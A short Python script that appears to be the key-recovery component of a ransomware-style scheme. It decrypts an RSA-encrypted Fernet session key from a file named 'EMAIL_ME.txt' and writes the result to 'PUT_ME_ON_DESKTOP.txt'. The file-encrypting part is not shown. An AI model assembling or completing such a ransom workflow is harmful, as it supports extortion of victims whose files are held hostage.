from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

with open('EMAIL_ME.txt', 'rb') as f:
    enc_fernet_key = f.read()
    print(enc_fernet_key)
#private RSA key
private_key = RSA.import_key(open('private.pem').read())

#prvate decryter
private_crypter = PKCS1_OAEP.new(private_key)

#decrpytor session key
dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
with open('PUT_ME_ON_DESKTOP.txt', 'wb') as f:
    f.write(dec_fernet_key)

print(f'> private key: {private_key}')
print(f'> private decrypter: {private_crypter}')
print(f'> decrypted fernet key: {dec_fernet_key}')
print('> decryption Completed')